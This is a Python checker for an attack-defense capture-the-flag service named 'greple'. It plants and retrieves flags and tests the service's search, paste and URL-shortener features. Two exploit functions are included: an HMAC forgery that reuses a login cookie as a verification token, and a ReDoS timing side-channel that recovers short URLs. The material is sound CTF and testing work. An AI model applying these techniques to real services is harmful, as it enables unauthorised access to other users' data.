"""Checker for greple service."""

import asyncio
import logging
import random
import re
from html import unescape
from urllib.parse import parse_qs, quote, unquote, urlencode

import fastapi
import httpx
from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import assert_equals, assert_in

from client import Client
from exploit import calibrate_redos, exploit_sca_letter
from noise import username_noise, word_noise
from utils import (
    PASTE_URL_REGEX,
    SHORT_URL_LENGTH,
    SHORT_URL_PREFIX,
    SHORT_URL_REGEX,
    assert_not_in,
    assert_status,
    get_search_console,
    get_short_url,
    paste,
    re_escape,
    register_user,
    search,
    set_safe_search,
    shorten_url,
    submit_page,
    token,
    verify_netloc,
)

_CHECKER = Enochecker("greple", 7777)
_FLAG_BASE_URL = httpx.URL("http://example.com")
_REFRESH_HASH_RE = re.compile(r"refresh\('([0-9a-f]{56})'\)")


@_CHECKER.register_dependency
def _client(client: httpx.AsyncClient, logger: logging.LoggerAdapter) -> Client:
    return Client.wrap(client, logger)


@_CHECKER.putflag(0)
async def _putflag_url(task: PutflagCheckerTaskMessage, client: Client, db: ChainDB) -> str:
    username = username_noise(128)
    await register_user(client, username)

    assert client.base_url.port is not None
    port = client.base_url.port - random.randint(1, 7)

    url = client.base_url.copy_with(port=port, path=f"/{quote(task.flag, safe='')}")
    await submit_page(client, False, str(url))

    await db.set("cookie", client.cookies["user_account"])

    return str(port)


@_CHECKER.getflag(0)
async def _getflag_url(task: GetflagCheckerTaskMessage, client: Client, db: ChainDB) -> None:
    try:
        cookie = await db.get("cookie")
    except KeyError as e:
        raise MumbleException("Missing putflag data in DB") from e

    client.cookies["user_account"] = cookie

    res = await get_search_console(client)
    assert_in(task.flag, unquote(unescape(res.text)), "Submitted URL not in table")


@_CHECKER.putflag(1)
async def _putflag_shor_url(task: PutflagCheckerTaskMessage, client: Client, db: ChainDB) -> str:
    username = username_noise(128)
    await register_user(client, username)

    short_url = await shorten_url(client, str(_FLAG_BASE_URL.join(f"/{quote(task.flag, safe='')}")))

    paste_url = await paste(client, word_noise(16), short_url)
    await submit_page(client, False, str(paste_url))

    await db.set("username", username)
    await db.set("cookie", client.cookies["user_account"])

    return username


@_CHECKER.getflag(1)
async def _getflag_short_url(task: GetflagCheckerTaskMessage, client: Client, db: ChainDB) -> None:
    try:
        username = await db.get("username")
        cookie = await db.get("cookie")
    except KeyError as e:
        raise MumbleException("Missing putflag data in DB") from e

    client.cookies["user_account"] = cookie

    res = await client.get("/console")
    assert_status(res, 200)
    paste_url = re.search(PASTE_URL_REGEX, unescape(res.text))
    if not paste_url:
        raise MumbleException("Failed to find paste URL")

    res = await client.get(paste_url[0])
    assert_status(res, 200)
    short_url_paste = re.search(SHORT_URL_REGEX, unescape(res.text))
    if not short_url_paste:
        raise MumbleException("Failed to find short URL")

    body = await search(client, f"user:{username}")
    short_url_search = re.search(SHORT_URL_REGEX, unescape(body))
    if not short_url_search:
        raise MumbleException("Failed to find short URL")

    assert_equals(short_url_paste[0], short_url_search[0], "Found mismatching short URLs")

    url = await get_short_url(client, short_url_search[0])
    assert_in(task.flag, unquote(url), "Flag missing from URL")


@_CHECKER.putnoise(0)
async def _put_public_document(client: Client, db: ChainDB) -> None:
    username = username_noise(128)
    await register_user(client, username)

    title = word_noise(128)
    text = word_noise(128)
    paste_url = await paste(client, title, text)
    await submit_page(client, True, str(paste_url))

    await db.set("username", username)
    await db.set("title", title)
    await db.set("text", text)


@_CHECKER.getnoise(0)
async def _get_public_document(client: Client, db: ChainDB) -> None:
    try:
        username = await db.get("username")
        title = await db.get("title")
        text = await db.get("text")
    except KeyError as e:
        raise MumbleException("Missing putnoise data in DB") from e

    body = await search(client, text)
    assert_in(title, unescape(body), "Public document not returned as result")

    body = await search(client, f"user:{username}")
    assert_in(title, unescape(body), "Public document not returned as result")
    assert_in(text, unescape(body), "Public document not returned as result")
    assert_in("of <b>1</b>.", unescape(body), "Unexpected result count")

    query = urlencode({"q": text, "lucky": "I'm Feeling Lucky"})
    res = await client.get(f"/search?{query}")
    assert_status(res, 302)
    if not res.next_request:
        raise MumbleException("No redirect location")

    word = random.choice(text.split(" "))
    await set_safe_search(client, True, re_escape(word))

    body = await search(client, text)
    assert_not_in(title, unescape(body), "Public document not filtered by safe search")

    body = await search(client, f"user:{username}")
    assert_not_in(title, unescape(body), "Public document not filtered by safe search")
    assert_not_in(text, unescape(body), "Public document not filtered by safe search")


@_CHECKER.havoc(0)
async def _cron(client: Client) -> None:
    await client.get("/cron")


@_CHECKER.havoc(1)
async def _verify_netloc(client: Client) -> None:
    assert client.base_url.port is not None
    port = client.base_url.port + 1

    username = username_noise(128)
    await register_user(client, username)
    url = str(client.base_url.copy_with(port=port, path="/path"))
    await submit_page(client, False, url)

    await register_user(client, username_noise(128))

    netloc = client.base_url.copy_with(port=port).netloc.decode()
    netloc_hash = await verify_netloc(client, netloc, "")

    done = set()

    while True:
        resp = await client.get(client.base_url.copy_with(port=port, path="/"))
        assert_status(resp, 200)

        for match in re.finditer("token=([0-9a-f]{56})", unescape(resp.text)):
            if match[1] in done:
                continue
            done.add(match[1])

            try:
                body = await token(client, netloc_hash, match[1])
            except MumbleException as e:
                if str(e) == "Unexpected HTTP status code":
                    continue
                raise

            assert_in(url, unescape(body), "Failed to find entries for verified netloc")
            assert_in(username, unescape(body), "Failed to find entries for verified netloc")
            return

        await asyncio.sleep(0.5)


@_CHECKER.exploit(0)
async def _exploit_hmac(client: Client, task: ExploitCheckerTaskMessage) -> str:
    if task.attack_info is None:
        raise MumbleException("Missing attack info")
    try:
        port = int(task.attack_info)
    except ValueError as e:
        raise MumbleException("Invalid attack info") from e

    netloc = client.base_url.copy_with(port=port).netloc.decode()
    username = username_noise(128)

    await register_user(client, f"{username}{netloc}")
    hmac = parse_qs(client.cookies["user_account"])["hmac"][0]

    await register_user(client, username)

    netloc_hash = await verify_netloc(client, netloc, "")

    body = await token(client, netloc_hash, hmac)

    return "\n".join(m[0] for m in re.finditer(task.flag_regex, unquote(unescape(body))))


@_CHECKER.exploit(1)
async def _exploit_sca(
    logger: logging.LoggerAdapter,
    client: Client,
    task: ExploitCheckerTaskMessage,
) -> str:
    if task.attack_info is None:
        raise MumbleException("Missing attack info")

    cal = await calibrate_redos(logger, client)

    short_url = "".join(
        [await exploit_sca_letter(logger, client, cal, task.attack_info, i) for i in range(SHORT_URL_LENGTH)],
    )

    url = await get_short_url(client, SHORT_URL_PREFIX + short_url)
    return unquote(url.removeprefix(str(_FLAG_BASE_URL)).lstrip("/"))


def app() -> fastapi.FastAPI:
    """Return app to gunicorn."""
    return _CHECKER.app
